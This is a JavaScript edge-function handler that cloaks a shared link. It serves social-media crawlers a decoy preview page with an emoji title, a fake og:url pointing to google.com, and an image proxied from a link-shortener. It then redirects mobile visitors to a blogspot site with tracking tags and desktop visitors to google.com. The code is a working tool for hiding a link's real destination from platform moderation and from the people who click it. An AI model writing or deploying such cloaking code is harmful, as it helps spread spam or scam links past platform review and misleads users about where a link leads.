export async function onRequest(context) {
  const request = context.request;
  const userAgent = request.headers.get('user-agent') || '';

  // 1. Check for Social Media Crawlers / Bots
  const isSocialBot = /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(userAgent);

  if (isSocialBot) {
    const htmlContent = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <meta property="og:title" content="💢 💢 💢 💢">
    <meta property="og:description" content="">
     <meta property="og:image"              content="//external.fbhv1-1.fna.fbcdn.net/emg1/v/t13/5168570377130764077?_nc_oc=Adr-Q8OGgYS3JAuWi8hm6h77oQ3UV0TIK1OO7yeb9Eyo2VVOLsEOMPANfz67OrHYjh0&url=https%3A%2F%2Fntgshortner.link18xx.com%2Fuploads%2Fimg_652b669a7b8f.jpg&fb_obo=1&utld=link18xx.com&_nc_sid=6b0826&_nc_ht=external.fbhv1-1.fna.fbcdn.net&stp=c0.5000x0.5000f_dst-jpg_flffffff_p500x261_q75_tt6&ccb=18-1&_nc_gid=n7ru9DxaIMb7ouPwe8p9hA&_nc_map=urlgen_bucketless&_nc_zt=3&oh=06_Q3_EAZkB5brDiSQ_ruefxCEwbom_hd5OOf-c3BH4iqqXKJDW&oe=6ACB17B3" />
    <meta property="og:url" content="https://www.google.com">
    <meta property="og:type" content="website">
</head>
<body>
</body>
</html>`;

    return new Response(htmlContent, {
      headers: { 'content-type': 'text/html;charset=UTF-8' },
    });
  }

  // 2. Check for Mobile Users
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

  if (isMobile) {
    return Response.redirect("https://waseey.blogspot.com/?utm_source=amsh&utm_medium=ansh6", 302);
  } else {
    return Response.redirect("https://www.google.com", 302);
  }
}
